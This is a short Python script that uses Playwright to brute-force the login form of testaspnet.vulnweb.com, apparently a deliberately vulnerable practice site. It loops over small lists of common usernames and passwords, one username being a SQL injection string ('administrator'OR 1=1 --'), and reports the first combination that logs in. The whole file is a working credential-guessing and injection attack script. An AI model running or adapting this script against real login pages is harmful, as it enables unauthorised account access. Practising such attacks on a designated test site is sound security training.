from rich import print
from playwright.sync_api import sync_playwright


url = "http://testaspnet.vulnweb.com/login.aspx"
username = "input[name='tbUsername']"
password = "input[name='tbPassword']"
login = "input[type='submit']"
usernames = ['admin','test','administrator',"administrator'OR 1=1 --",'user']
passwords = ['12345678','administrator','admin','test','user1234']
text = "signup"
login_success = False

with sync_playwright() as spr :
    browser = spr.firefox.launch(headless=True)
    page = browser.new_page()
    page.goto(url)
    for users in usernames :
        for passw in passwords :
            page.fill(username,users)
            page.fill(password,passw)
            page.click(login)
            try:
                if text in page.content() :
                    print(f"[red]login failed[/] for username:{users} | password:{passw}")
                else:
                    print(f"[green]login successful[/] for username:{users} | password:{passw}")
                    login_success = True
                    break
            except:
                pass
        if login_success == True:
            break
    browser.close()